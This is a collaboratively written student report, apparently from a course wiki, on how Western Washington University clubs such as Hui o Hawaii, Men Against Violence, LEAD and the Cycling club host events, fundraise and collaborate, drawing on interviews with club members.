A very effective method in hosting events is for a group to create a lot of interest before the actual event so that more people will attend. This can be done with a little bit of enthusiasm from group members and with help from other groups. For a comparison, look at the Hawaiian Club whose members show tons of excitement in Red Square before holding a Luau or other get-together. By dressing up, waving signs, and talking in a friendly manner, they attract other students toward their project. The World Injustice Awareness Club effectively made people interested in their cause by dressing all in black in Red Square and talking about the School of Americas and about how many people have died due to the organization. For this event, the World Injustice Awareness Club got in touch with several other clubs on campus to garner further support and the substantial number of people they were able to gather made the event seem even more interesting to students passing by who then stopped to watch as members of the WIAC proceeded to the main point of their event: a &quot;die in&quot; in which the group members laid on the ground as if dead to represent the people killed by the School of the Americas. This dramatic touch to the event was very effective in giving the WIAC a victory in their cause by making people aware of the injustices occurring in the world. This event invited people to ask questions and learn more.

An effective organizational strategy that Women of the Wood’s uses is promoting a message. The club’s main goal is to involve women in outdoor activities and bring them together with other women, forming friendships.  One of the events the club put on this quarter was a showing of a movie about women in Africa dealing with incontinence. While the movie didn’t directly relate to outdoor activities, it did a very good job of making all the girls feel united because you were able to see how poorly women were treated in other areas. The club also made t-shirts promoting their club, with some of the proceeds going to foundations helping women in Africa. The club also brings in women who are currently working in outdoor fields (a Mt. Rainer park ranger was one speaker this quarter) to promote outdoor activities and to also get women more excited about being outdoors. This is an effective organizational strategy because it gives the club more depth and shows that they are trying to make a difference. Another club that seems to do a very good job of promoting a message is Western’s Men Against Violence group. I’ve seen a lot of their advertising, in Red Square and through different fliers. The message they are promoting is such a strong one that it is a compelling issue for people to join. It’s very clear what the club is about as well.

Western Men Against Violence uses events like Walk a Mile in Her Shoes to involve students and community members and inform people about violence against women. Anyone who wants to is invited to march. Also they donate the money they raise from the event to the local women's shelter and this year they used the Boundary Bay Brewery as a place for people to congregate after the event, making the community more involved. Holding events like this is a very effective way of promoting the message that they are trying to spread. The group has also done bake sales and smaller events in the past.

As the president of the new AS Social Issue club on campus called the Student Coalition for Immigration Rights and our mission as is to bring awareness to the community about the struggles of U.S. immigrates through workshops. Our goal is to help them obtain a higher education and build a better future through the presentation of workshops and community involvement, and creating equal opportunities for all. All the member of Student Coalition for Immigration Rights has a common goal which is to bring awareness of undocumented students but to also move past awareness to taking action. All the members including myself have passion for our mission. However, this quarter we focused on creating workshops that we presented the last week of May for students, staff and Bellingham community. In this workshop we informed Western on students who want to pursued a higher education but cannot because they lack proper documentation. An example of this is if a student does not have a social security number they can’t apply for financial aid and therefore cannot get grants, loans, and often cannot get scholarships either. Even if undocumented students find a way to pay for college, without a social security number, they may not be able to get a job and this is creating and perpetuating a lower class of people that will never be able to move out of poverty. In our workshops, we addressed this and show that by supporting the D.R.E.A.M act, which allows undocumented students to obtain residency under certain requirements, thus they will be able further their education and have a chance to succeed and overcome barriers that they weren’t able to before. We also will focus on other undocumented individuals and provide workshops on how they can protect their rights.  These workshops will acknowledge the voices that can’t be heard or can’t speak out.  

A future struggle for S.C.I.R is whether things will be get done and accomplished. For this quarter it is that fact whether or not our workshops meet our deadlines. I believe they will if we all put in our teamwork and get our parts done. So far we have met one deadline which was the presentation for the Migrate Youth Conference which we got done and presented. It was kind of creamed but we were able to pull it off. A struggle that I fear is if we will get our events done for the deadlines and how they turn out. Something I have to remember from the interview I had with co-chairs for M.E.Ch.A. Mirella is that no matter how many people show up to the event you as a leader need to go with it all the way. And as Abraham said keeping your eyes on the goal no matter what and sometimes things fail but we learn from them. I am trying my best to be an effective leader but I am still learning. As a new club on campus we lack the knowledge of knowing how to run a club, especially in the funding for events, in particularly publicizing for the workshop we will be presenting. However, as a leader I will challenge myself to learn how to run a successful club by going to AS advisors and asking them for help or talking to Michel for the ESC for help on whom to turn too. Along with these terms I know all of the M.E.Ch.A. leaders and will ask for their guides.  In the end we publicized as much as we knew through posters, fliers, and facebook and we still go very few people. However, overall the workshops were successful by the fact that every audience that came learned something new which was reflected off their comments. However, I wish we could have gotten more people to show to our workshops. In the end we got all the posters for our presentations done and out on western campus but I wish we would have had it sooner. We will have to plan how to get more people to come for next year.  


I believe our club is going to be successful even if we are new club on campus with less experience. Even at that we still have a strong support from M.E.Ch.A and have great recourse on campus of where to get help and if we use our resources wisely then we will make can make things happen. This summer I plan to get on step ahead for next year is creating an agenda which I will have other members helping me on it as well. We will be arranging an agenda of what we want to get done for next year and how we can make those goals happen.  Another few things I wanted to add about S.C.I.R  is we contact each other through email and we have a Facebook group. We plan to create a website of our club during the summer. I also added to our club’s mission after I had the interview with Abraham and Mirella, reaching to Middle and High School students in particularly those who are undocumented and encourage them to continue fighting for their education. I plan to introduce this to the club after our workshops here on campus. I will encourage S.C.I.R. members to present these workshops after finals to Middle and High School and try to make it a bit different by targeting students to continue their education whether documented or not.  I am excited for this group and hope it makes a difference. I hope to let others voices be heard, but not only that we will be making changes to make sure their voices are heard through our workshops, supporting the Dream Act and through our club. We will continue to show promote awareness. Who knows maybe we will become a legacy.  Where ever we end up I know we are making a difference.



Western Men Against Violence does do a great job of hosting events throughout the year. An example of that would be Walk a Mile in Her Shoes. This event is an annual march where men walk a mile in women’s shoes to stop sexual assault and rape. A lot of planning and advertising goes into walk a Mile in Her Shoes. WMAV creates posters through the campus’ publicity office to inform Western students.  They begin this preparation about two months prior to the event. This event brings out a lot of male participants that are able to make a direct impact on the community. The club also raises money throughout the year to give to organizations inparticularly a local women's shelter. Another activity that a group member went into detail about was Take Back the Night. It is an all female activity where they walk down town at night. The men remain back at campus and hold a candlelight vigil. WMAV is a dedicated club that is willing to help other clubs.

===Holiday===

Holidays are a great excuse to host events because a lot of people have free time and are in search of something to do. Not only will this draw a lot of people, but holidays make it easy to advertise because instead of using the perks of the organization to lure people, the club can simply say &quot;come celebrate the holiday season with us&quot;. This saying is universal, but virtually any club can use it to promote their own club. Another way to host holiday events is advertising holidays that are unique to a club. This will draw adventurous crowds and will ultimately benefit any club.

For the South Asian Student Association, and any cultural club in general, hosting events during unique cultural holidays is a great way to raise awareness, both for the club in question, as well as for the particular culture. Aside from that, holidays are a great reason to get group members together and add to the list of how members can relate to each other. A good example of this is the Luau put on by the Hui o Hawaii culture club, this event seems to be a hit year after year and is also a good means of recruitment. If these events want to be used as recruitment, early advertisement is recommended, if the event has enough to offer, and enough renown in the western community, it may even be possible for tickets to be sold to turn the event into a fund raiser. If it is not viable for a club to celebrate cultural holidays, unique cultural traditions can also be shared at westerns annual international night, such as the dance put on by SASA.

Hillel of WWU makes sure to conduct all of the major Jewish holiday events even during Western Washington University’s breaks, so that members are able to stay involved with their Jewish tradition away from home. Many members are unable to go home to their family synagogue for multiple reasons, but still want to participate in holidays they have grown up with. Hillel of WWU makes that possible, by conducting traditional events which are at either the local synagogue or at their WWU location. All of the proper ceremonies and possible dinners are performed, so that members can feel comfortable. The major holidays that they hold are Passover, Yom Kippur, Rosh Hashanah, and Hanukkah. Rachel Rasmus, the Vice President of Hillel of WWU, jokes about the PYRH kids who only come for the holiday events, but for none of the other fun, social events that the group puts on. But that just shows that Hillel of WWU is a place for Jewish students to come and become more involved with Western and their religion. The Hui o Hawaii culture club also likes to put on Luau on every year for their members and for others to join, as a way of advertisement and a way for members to connect to their culture. Any type of activity that allows for the club to receive recognition from the rest of Western allows for students to hear of the club and possibly become involved as well. Hillel of WWU tries to promote their events and invite other to join so they are all able to experience the wonderful Jewish holiday events and become well known on campus.

===Community Service===
LEAD is a great AS group that has a large amount of people interested in their events.  This is mainly because the nature of their &quot;work parties&quot; is so positive.  Every event that they host cleans or promotes the environment, and many people want to take part in making their own community a more beautiful place to live.  The fact that their events are services to the community not only attracts many people into taking part, but also helps with funding.  Local businesses are very willing to donate money to an event that will make their local area a nicer place to live.  The Men Against Violence have similar luck with events also because their events really are a benefit to the entire community. It seems for an event to go well not only do groups have to have some funding but there also needs to be a decent amount of people interested in the event, and a service to the community usually makes these two requirements easier to achieve.

{{TOC|limit=3}}
== Fundraising ==
Fundraising is an essential aspect to most clubs at Western Washington University. Fundraising equals money, which makes clubs expand and become more appealing to potential members, as well as encourage current members to stay. With more money the clubs can provide more opportunities for their members. For example, bringing professionals in to talk or putting on events. Fundraising also allows current members to become closer with each other, as they work together raising the money. When fundraising as a group or a team it is often easier for new members to transition into the club.

Many groups rely on fundraising to help support their club as well as plan and put on special events relating to their club. Fundraising can be conducted in many ways ranging from car washes to sponsorships from other organizations. The dependency of fundraising differs from club to club but all clubs need funding to keep their clubs going thus proves the importance of fundraising.
Finding a secure form of fundraising for the club is necessary. Some clubs only fundraise once a year and others may fundraise throughout the year. Any amount of fundraising can help a club. Some go to parents and alumni while some do fun activities for funds.

== Need for fundraising ==
A) The Scottish Country Dance Club are given an amount of 50$ by the AS. The program has bake sales and their own fundraisers to support the performances as well as members who can not afford the costs. On top of limited funding, the club has a lack of diversity. The women out number the men, making the traditional dance less realistic. With additional funding to help the program, the club could use the money to not only recruit more men, but use it to promote the club and getting attention from the entire University. Also, more men that join could spread the word to other men making the program more effective as well as more realistic. 

The Western Washington University Associated Students clubs and organizations are alloted a budget at the beginning of the year for their needs. However, many clubs needs and events exceed what is provided. In order to take their programming to the next level many organizations have developed systems for obtaining the funds necessary for them to provide a service above and beyond what is provided. Although, some clubs do not use their budget at all. They raise their own money through fund raising so the club is not dependent oh Western. The clubs on campus do have their own personal budget, and yes some student groups do spend too  much of their budget on pointless things, but most clubs use it for promoting their clubs with t-shirts and such. 

A. The Slum Doctor Program needs to fundraise in order to keep their support up in Africa. They currently support around 54 girls in Africa which allows them to go to high school and get an education. Education is expensive for people in Africa because people are so poor. Its not that expensive for people here in America to support them. Also, the Slum Doctor Program helps with a hospital with people that have aids and spread awareness about it. Fundraising is greatly need to support the girls and also help with funding for the hospital. Bake sales are what work best, but they are looking for other events to join or even organize to get more funding. 
===How many fundraisers a year===
Fundraising is  big part of what makes the clubs and organizations here at Western Washington University, let alone any were else, stay afloat. It is really important to be able to raise money as often as possible or as needed. Fundraisers also help get the club or organizations name out to the community as well. They give the community a chance to talk to club members and find out what the club is all about. They can be a great way to bring people together

===Why fundraise===
Fundraising for clubs is one of the most important pieces of a club, or at least one that is trying for bigger and better things to accomplish.It is almost always important for clubs to fundraise. This is because the amount of money each club is given at the beginning of the year isn't enough. There are many reasons why clubs need money such as activities, meetings, or advertisement. There are many ways clubs can fundraise and usually it shadows their club and what they represent. It gives out another source of advertisement that way. Fundraising can also leave a fun environment outside of the usual meetings.

The Hui O’ Hawaii club had a discussion and made a movement to purchase a shave-ice machine. During this conversation the group prominently implicated the desire to use this device as a fundraising mechanism. Their objective was to sell snow cones, etc. during spring, summer and possibly fall. This is an eminent method for having extra money in case unexpected merchandise is bought for the well-being of the club. Fundraising, such as selling snow cones or other goods, often provides awareness to other students about the club's overall goal and shows that the club desires to be active with the student body.


Along with providing awareness, active fundraising can make it possible for clubs to better achieve their goals and open doors to numerous possibilities. One of the major reasons why Students for Renewable Energy was able to get the school using 100 percent renewable energy was due to their relationship with the administration. Vice president of SRE stated that her advice to new clubs would be to, &quot;Have good relationships with the administration and maintain them to keep projects going.  The green energy fee given by the administration set a standard that SRE can only get things done with funding. It’s important to know who to talk to (board of trustees and the sustainability office) and who not to talk to.&quot;

In addition to the obvious purposes of fundraising, Rugby Club integrates other uses into their fundraising practices. Besides being a good way to gain exposure like the Hui O’ Hawaii Club does with their snow cones, fundraising can also be an opportunity to share ideas and welcome new members.  An example of this is Rugby Club’s annual Alumni Banquet. At this event, former members of Rugby Club contribute to keep the club going, are treated to a nice dinner, and of course play a game of rugby. This allows newcomers to be initiated into the group and learn about the game from some older players. The alumni can also contribute ideas for fundraising and events having gone through the same things when they were members of the club. One other reason that the Rugby team has had to fundraise is because of the high cost of attending far away games. The university is only willing to provide a fixed amount each year to cover travel costs; since rugby often played several games in Canada, Oregon and California, and since about 20 people attend each game, the costs of traveling each year usually exceed the allotted amount of money by WWU.

In many cases the university does not have enough money to give as much financial support to as many clubs as they desire. The cycling club has great difficulty gaining funds while clubs such as the basketball club get a lot more support from the university. The cycling club has had to become very creative in the ways they get funds and promote themselves. Hosting events and being computer savvy helps the club get money for advertisement and other expensive needs.

===Fundraising for events===
Hosting events can be a great way for clubs and organizations to promote awareness for their cause. They are also a good tool for club members to get to know one another and bond as a group. In most cases, funding is required for various aspects of the event. The funding can come from a number of sources including sponsors, benefactors, savings or the university that they are affiliated with. In some cases however, events are actually held to gain funds from the event participants. In either case, event functions are generally quite important for the club that hosts them.

In the case of the Western Cycling club, the funds that the club gathers for the events that it hosts actually exceed the funds required for the event. Other schools in the division are required to pay a flat fee to compete in the event. This is in contrast to most events hosted by other clubs, such as LEAD which have to get funding for their events from benefactors and sponsors. The funding acquired in this way rarely exceed the requirements. The excess funds are used by the club to fund other club expenses.

===Is there a need for fundraising===
Most clubs here on campus use resources to fuel the club. Whether it be food for the members, discount rentals for excursions, tools to complete projects, or other general supplies, the clubs use money. For example The Hui O' Hawaii club has a moderately small intake as far as recruitment goes, its needs are lower than other clubs so It is understandable in a small club with no high profile donations, therefore; most clubs need fundraisers to help them build credibility and funds to eventually improve and evolve their membership. Fundraisers are a fun way to get people interested and active in their respective clubs, and they raise money for activities that will build further interest and move towards the clubs goals. No one wants to be a part of a club that does nothing so money will help the activities and meetings each club puts on. Donations, sales of goods, and events are all different methods WWU clubs have used to raise money. The Sub team for example has had large donations to the club from private donors. These funds are used for tools, travel, material, and even advertising.  Each club has some form of fund raising to push their budget past what each club is allotted.

The World Injustice Awareness club needs fundraising in order to host more events in the future. As of right now the club tends to depend on the $50 allowance that they receive every month. Fundraising is important as it gives money to the club, which then gives the club members the opportunity to decide what they want to do with it. Fundraising is a good resource to make the club more well known to students. The only way the WIAC gets their name out there is by the club fair. One of the presidents of the club mentioned to me during the interview that I had with her that in order to advance their fundraising techniques, they will promote their club in the AS review and the Western Front. Overall, the WIAC can be maintained with a lower budget than other clubs because many of their events are held for free. The people that volunteer to participate in these events for WIAC are so thrilled that people are interested in social issues that money doesn't matter to them.  

When clubs wish to hold events or activiites, it is often the case that the funding comes out of the pockets of the members. For instance, the croquet club president, Devan Spencer (2009), pays for most of the cost from his own wallet. He provides all the equipment and also pays for most the prizes. Its raises the question of why? Why put your own money (especially as a college student) towards a club you participate in. Without tournaments, activities, and prizes, then what makes the club any fun? Fundraising can be a way to not only raise money but premote the group. Again referring to croquet club, a response that was given by the president of the club on the subject matter of what he would change was, &quot;I wish the school offered some sort of website or schedule for clubs. Not everyone has a facebook, and if we had a website, we could better keep track of events and the leaderboard. Also we could create fun things like player bios. All of these things will attract members and make them feel more apart of the club.&quot; Clubs are for enjoyment and friendly competition, but funding and other ways of premoting clubs would be beneficial for all clubs.


Although fundraising and money are often needed for AS clubs, a major strength of the Ritmo Salsa club is that most all of their resources used are free.  This means that they don’t need to spend any excess money, and don’t need to worry about fundraising.  All of the interviews in my group confirm that the $50 given to the AS clubs was enough to support the salsa club.  In fact, they haven’t even used any of the AS money yet.  In an interview with one of the presidents of salsa club, she stated “If we need money we have our AS budget, but we're saving that for a time when we may need it.”  This is very different than most other AS clubs.  For example in an interview with LEAD, they said  “We get $50 a year allowance as an AS club, which does not get us very far. That $50 usually just gets used for office supplies.” By keeping the club simple, and taking advantage of free resources, some clubs can run completely free.

While most AS clubs rely on fundraising to fuel their group, Sexploration relies solely on the funds from the Sexual Awareness Center. Sexploration uses the funds from the Sexual Awareness Center for publicity. Sexploration chooses to advertise their club and meetings on facebook, Western Washington University's website and by putting up posters around campus. They are allocated $72 per quarter, however this is more than needed due to the small cost of publicity. On the other hand, fundraising could be very beneficial to this club. The attendance of each meeting fluctuates due to the publicity of each meeting. If they used their funds from the Sexual Awareness Center and organized fundraising events, the money could go to more publicity to attract more members.

KUGS is a non-profit organization. As such, it has certain restrictions, as far as what they can say on the air, etc. For example, they cannot advertise for a business on the air, but they can thank business for a donation. Because KUGS is non-profit they rely on money from the University as well as money from donations. Most of the donations they receive are from local businesses. It is important that they receive these donations to keep operating. Also, they would like to expand their frequency from 10 to 100, but they cannot obtain this goal without the help of donations and fundraising, especially with budget cuts. KUGS has been operating for about 35 years now, so they must be doing something right!

The South Asian Students Association club needs fundraising to host more events. Fundraising is a great way to get people in the club to meet together and plan a way they can raise money. Fundraising is important as it gives money to the club, which can then decide what they want to do with it. There are many options; including hosting more events, having bowling nights, and even group trips to various locations in Bellingham or Canada. Fundraising is also a great way to attract more members. This year, the club has been very good about spending money; the balance for the money was pretty high. However, they have been donating a lot of it to other clubs so they can host some of their own events, which has been putting a hole in the balance. The club has some good ideas for fundraising, such as having a Henna Booth, which would attract many people.

The Western Rugby team is not financially supported as a team. Similar to the South Asian Students Association, fundraising is a must. The SASA needs funds to host more events while the Rugby team needs funds for equipment and competition. Financially, the rugby team relies on the small club budget provided by the university, club fundraising, donations, member contributions. The team’s main fundraising event is their Alumni event were they host a game between the current members and the Alumni, a big dinner and a game of golf all during the same weekend. Other fundraising activities include working for the cascade bicycle club, working security at events such as concerts and the apple cup. Although more disposable money would be nice for equipment and travel, the Rugby team currently at a bare minimum, does not require a tremendous amount of money. Members usually provide their own apparel (except jerseys) and shoes; they also usually provide their own transportation to matches. Tournament fees are also paid for by members and any funds the team may have in their account.
	
Fundraising is important to any non profit organization dedicated to helping others. The slum doctors program is all about raising money to support people in Africa. Any money gotten is used to buy food, health care, and educational access for people who would not this opportunity otherwise. In the past girls in Nigeria were sent to school but lack of funds has been an issue in recent times. Bake sales are always a good call for raising money because they don't require much to host but in recent weeks the end fair festival in fair haven was used both as a way to generate donations and spread the word about becoming a member. Ideas of T-shirts have been discussed which would be a great idea since you would be making money and spreading the word at the same time.

Many clubs are not in need of fundraising or fundraising events because they operate successfully with things that are already provided by the school.  The WWU body building club only needs access to the REC Center which comes as a part of their tuition.  As large a club as they are their major resource is people and in that case they do not need money.  Even for their Western's Strongest Man competition they simply used equipment that was already provided by the school and simply used their man power to bring it out to the track.  This is very similar to Western's Dance Clubs such as Tango or Ritmo Salsa because all they need is a room allotted to them by the University.

The Korean Student association does not have  great need to fundraise for two major reasons. First off there are very few members and each meeting consists of presentations given by members of the group. No extra material is needed to fundraise larger quantities of money. For the occasional BBQ the group of course has money from the University as an allowance but usually each member of the group contributes independently one way or another. Although this may not work for groups needing many outside resources and larger groups, this system proves to work well for the Korea Club.

Fundraising is something that the WWU Cycling team needs in order to send their riders to events. Although they have sponsors, a membership fee, and the North Shore Circuit Race, the team still cover the traveling expenses for their top 5-6 riders. Unfortunately for them, when the host the North Shore Circuit Race some teams that come to compete have to pay a fee just so the Cycling team will make a profit. Fundraising is something that the Cycling team has to do, unlike the Ritmo Salsa club. The Ritmo Salsa club don’t have a need to fundraise due to the fact that almost all of the resources that they use, they use for free.

Every club has the choice of how to run their club. As a result, it can be seen that fundraising is a need, but also some clubs can go without fundraising. Like with the Ritmo Salsa club, as said has their own materials, and doesn't feel the need to necessarily fundraise. The advantages of fundraising though include the interest of more members added to the club and also it can also be useful to have that extra money which can provide new materials/equipment, more effective ways to try new things for the club, etc. So yes, fundraising does have their advantages and does help with supporting the clubs and all, but here, in some examples, fundraising is not a necessary demand.

==Types==
The clubs at Western are offered a certain budget, so they have to fundraise to be able to get all the money that is needed to host events.  Many clubs go about fundraising in multiple different ways that help lead them to the success of their club and events. Some different types of fundraising are verbally communicating money requests, posters designed to attract publicity to the club, having students sign a petition explaining why the club needs money, and hosting rallies or conventions to draw positive attention to the club. It is essential to have a variety of types of fundraising strategies for obtaining more funds for the club. Each type of fund raising increases the clubs chance of receiving additional funds to help support the clubs financial needs.
One great way though to get your name out there and receive support is vendors row. Everyday thousands of students just from WWU pass through there and even more people from groups that are visiting to just people walking through. One of the leaders from the campus organization called S.E.E. has told me how whenever they do fundraising they always try to get a place on vendors row just because its so popular. For those of you who don't know where it is located it is the area between the street in front of the VU commons and door way to VU market. There are some well known vendors that reside there such as El Capitans hot dog stand which has been able to make good money by having a stand on vendors row. Its a good place to get publicity and funding at the same time and is worth taking a travel down because you never know what you'll find.

Another effective form of fund raising is through grant writing. The internet is a key tool for finding grants that apply to the club's focus. There are thousands of grants out there for very specified issues and purposes. There is a class offered at Western on grant writing. Applying for grants may be one of the most efficient ways to fund raise because grants range from small amounts of money to tons of money.   
===Method===
Western Washington University's LEAD group (an environmental organization) seems to be very skilled at obtaining capital. This strength lies largely in their ability to network in the community to access finances. In an interview the group’s assistant director, she said that the group gets most of its money via charitable donations from the Bellingham community. In interviewing the assistant director, she said “... local businesses are more than willing to donate money to a club when the group is all about making the local area cleaner and environmentally friendly.” Donations come from local businesses like Fred Meyer, Haagen, Avenue Bread, and the Bagelry. It is the job of the co-directors of the group to contact local businesses for charitable donations. The strength of fundraising is similarly seen in Western’s Chabad Jewish club. The Chabad group also looks to the Bellingham community to obtain funding to conduct activities. In the case of Chabad, they look to Jewish individuals of the community for donations as well as local synagogues. LEAD however, makes a connection with local businesses to get funds. Regardless of the source, a group that can look outside its immediate means and into the community for financial help can prove to be very efficient and prosperous.

Western Washington University’s Photography club is a fairly new club. It’s only a year old but developing quickly. Fundraising is currently is the clubs main focus. The president of the club, Carmen, is raising money for the use of the darkroom on WWU campus by participating in art walks. Each member of the club hopefully will have work that they’d wish to sell. The photos will sell however, Carmen says “…finding places to sell the groups photos is difficult”.  The photography club isn’t the only club that fundraises by selling things. The WWU Biology club holds yearly bake sales that accumulate a good amount of money. They use this money for other things such as gas for field trips or Biology Club t-shirts.

Western's submarine club's members are incredibly lucky.   The submarine club generally does not have to fundraise because they get funding from private donors.  However, their members have specific skills in engineering submarines so they do not have to be incredibly selective in their choosing of members.  Although their private donors account for most of the money they are allotted, they also publicize their projects.  Their publications draw in prospective students to their programs which allows them to gain more funding for the club's purpose.       

===Success===

Successful fundraising is key in order for clubs to make enough money to host activities and/or events.  The A.S. only supplies $50 to clubs, so additional funds need to be raised. Current Western clubs have had success with various types of fundraisers, including alumni events, letter writing/calling for donations, and asking local businesses to be club sponsors. Bellingham businesses consistently offer donations and support to Western clubs. Clubs that have had success with local businesses report that organization is key to securing funds. Businesses will be more willing to donate if clubs appear professional and organized.

Western Washington University's Rugby Club has continual success each year with their end of the year Alumni Event.  Each year the club holds a dinner for their Alumni members, with an actual game that follows; current players against past members.  The captains said this event is always a huge success for their club because the Alumni members enjoy getting together and talking about the good old days, and with that, usually contribute a good amount of money to the club.  The Rugby Club was unique in the fact that other Western AS clubs mentioned that successful fundraising was a need for their club rather than an asset.  It would be beneficial for other AS clubs to incoporate some sort of Alumni event into their agenda because not only do past members of the club really enjoy the event, current members also take delight in getting to know its club's history and people.  Since the event is held in honor for Alumni events, the past members are willing to contribute a fair amount of money to club, ultimately giving the current club more opportunities to grow.

Another club that has had successful fundraising attempts is WWU's Students for Disability Awareness (SDA)group. Through social networks, such as the Western Foundation, writing letters, calling for donations, and various resources on campus, the SDA has had shown strong accomplishments in fundraising. Just this past year, the SDA raised nearly $290 for a student to travel to Taipei, Taiwan to participate in the Deaflympics. The SDA and WWU's Rugby Club both are similar in that fundraising is not a necessity, but instead a useful element in the AS club network. Helping the student travel to Taipei was not necessarily a need for the club, but instead an enriching experience for those apart of the effort. As stated previously, SDA uses many resources to their benefit. For example, the Activities Council, Board of Directors Large Event Loan Fund (for large events like Disability Awareness Week), and the Diversity Fund are all financial resources that are available to the SDA. In addition to these organizations helping to raise money, the Diversity Resources for Students is able to provide printing and copying services to the club for little to no cost. The WWU Rugby Club and the SDA both are remembering to first look at the willing resources (alumni, on campus organizations) for fundraising and using those sources to advance their club and provide quality diverse programs to the WWU community.

WWU clubs can find fund raising success from the university community and from local Bellingham businesses.  In interviewing Ryan, a former member of the Western Sound System Federation (Reggae and world music club), it was revealed that this organization had strengths in the realm of finances. The WSSF utilized funds available through the school, in addition to grants from outside, commercial sponsors. Ryan said “there’s a lot of money out there available for clubs at Western. As long as you have a truly good idea and you can prove to the school that they should have reason to invest, they will help your club out.” In an interview with a member of Western cycling club, Yale Johnson found that members of this club were in part supported from outside, commercial sponsors such as Noble Sports Chiropractic, Felt Bicycles and Haggen (supplying cyclists with food). By building rapport with local businesses, university clubs can build a relationship of success with companies that sponsor them. This reciprocal dynamic is beneficial to all involved.

After reviewing the successes of fund-raising by the clubs here at WWU, it seems apparent that despite the effort and contributions made in clubs, it is essential to have some type of outside financial support. In a community like Bellingham, it seems like local corporations, companies, and even individuals are quite generous, and that most would happily consider providing some kind of donation to a club that needed money for its growth and prosperity. Just as all the clubs above have done, the LEAD club has found ways to make up for insufficient funding by fund-raising in the community. For example, the club put together a work party on Earth Day to collect money. Their fundraising primarily is through advertisement and personal meetings with members of businesses here in Bellingham. If LEAD proceeds to create more fundraising opportunities, they will benefit tremendously in their ability to recruit new members.

===Types===

When fundraising is mentioned, the majority of people may think of bake sales, pledge walks, or knocking on doors and with the availabity of using vender row in front of the Viking Union. A type of fundraising that is also beneficial for advertising, however, is finding a business or even a single person, to serve as a sponsor for the club. Women in the Woods for example, might be able to find a small company that sells outdoor equipment willing to sponsor their activities. This would allow the company to advertise its own goods while enticing students to participate in the club as well. It would be similar to local sport teams that are sponsored by businesses within the community. Not only does finding a sponsor save the hassle of setting up multiple fundraisers, but it can be beneficial for the sponsor AND the club while developing important relationships. Clubs would be able to inquire about sponsors by writing up letters explaining what their club is about, events that they would like to plan, and the request for a sponsorship or even a simple donation, depending on the financial situation at the time. The leaders of the club should then present this letter to a manager, supervisor, or owner in person while introducing themselves on behalf of the club. In some cases, it might also be appropriate to call a few days later to simply check in and remind them of their previous visit. If someone does agree to sponsor the club, it is then the clubs responsibility to keep the sponsor informed of events, specific needs, and to create some sort of advertisement that can be posted at events that represents their sponsor. At the end of the year, it is essential to further thank the sponsors with an appropriate card and gift and inquire about further sponsorship for the next year. Now a fundraising that could be more convenient to the students here at Western, club members can utilize the venders row that is in front of the Viking Union. Making Western Diverse took this to this full advantage with the selling of Jamba Juice smoothies to fundraise for an upcoming event in the fall. With the access of customers being the students who walk in and out of the Viking Union each day, the fundraising event was deemed as successful.

The WWU Cycling club has developed a synethesized approach to both funraising and advertising for their clubs membership as well as prospective memberships. WWU Cylcing hosts the North Shore Circuit Race where schools in the same division as Western participate, as well as non-school affiliated riders participate All riders pay an entrance fee, and become eligible for services,(Noble Sports Chiropractic) discounts,(Felt Bicycles) and other items (Haggen Foods)that the clubs sponsors donate.The monies generated by this event coupled with the club's club fee provide the majority of funds &quot;needed&quot; allowing the club to utilize their time training.


One good way to raise money for a club is having a bake sale.  The Biology club has had great success in the past with bake sales.  The club's main needs for funds are for t-shirts and field trips.  By having a bake sale in which people contribute goods to sell, the club is able to do the things they want to do.  For example, this year, the Biology club held a bake sale and raised enough money to buy t-shirts for the club and also go to the Seattle aquarium.  There are many effective strategies for fundraising, but none are more delicious than baked goods!

Another great idea for fundraising has been a tradition in the sailing team for a number of years.  This type of fundraising may not work for all clubs but is a pretty inventive way to make some money for the team.  Each year the sailing team hosts an alumni regatta.  This is a race that is put on by the members of the club for alumni.  The team charges for tickets for the race.  The race also is an opportunity for the team to sell t-shirts and other goods. Since not all clubs are sports teams this may not work.  This is a great way for the team to show the alumni what the Western sailing team is all about. Though this year is not expected to be quite as profitable due to the economy it is still a fun way to raise some money. This type of interactive fundraising is moving along the right track instead of just the sale of products or asking for donations teams can simply provide entertainment ant their time.  

A strategy that the WWU Cycling team has used and developed over the years is the combination of fundraising and hosting an event to fund team expenses.  Each year the cycling club hosts a collegiate race for all of the schools in the conference, and to promote fundraising they have extended this race so it is open to the public as a USA Cycling condoned event.  This race- and the great increase of money earned from entry fees associated with opening it to the public- has proven to be a successful and worthwhile use of time and has helped the team grow and compete.  Other student organizations may not have structure in place like USA Cycling, but it is a fundraising opportunity that also allows you to interact both with students with similar interests and with the community, so it is well worth the effort put in place to organize it.

For clubs that don't have very many expenditures, there is a simpler method.  When the tango club needs money for events they ask for small contributions from members who plan to attend.  This works well if there is no membership fee for the club.  As long as club leaders ask for small donations, members are usually willing to chip in  More costly events may require other methods, such as the biology club's bake sale, but for a club with minimal expenditures, this is a good method. It requires little effort and can generate the required funds very quickly.

==Collaborating with another club==
Finding groups to collaborate that have a similar fan base can be a huge asset to both parties. One main issue that many groups seem to struggle with is no so much keeping members returning, it's catching their attention and getting them involved initially. This is one way for larger, well defined groups to help newly emerging groups gain more popularity. Multiple clubs working together can produce a very successful event that is much more beneficial to all of the clubs involved and it can aid the new group in learning ways to effectively fundraise and gain new tactics to drawing in crowds.

===Benefits of collaborating===
Collaborating with other clubs can be extremely useful and beneficial. During times when clubs are facing problems using other clubs for support can help revive and assist them in solving their problems. When the South Asian Student Association (SASA) faced difficulties in retaining membership collaborating with Latino Student Union (LSU) proved to be successful in increasing attendance. SASA and LSU put on a joint bonfire which attracted new members to both clubs. In the Ethnic Student Center (ESC) through steering meetings, collaboration and communication is shown between the clubs. The clubs all vote on where the ESC money should go to and also use each other to advertise and promote their events on campus. At each club meeting, the steering rep announces all the activities and events other ESC clubs are putting on. Another example of the benefits is shown through the strong collaboration effort between Woodring Clubs Diversity Inspired Volunteer Educators (DIVE) and Student Washington Education Association (SWEA). These two clubs often put on many joint events and many members are in both clubs. The benefits have lead to a strong cohesion and use of each other’s resources. When unable to fundraise enough money they have collaborated and reached the goal together. An example of this is when they created a joint Relay for Life team. Collaboration and communication between clubs is an effective tool and often yields a plethora of benefits.

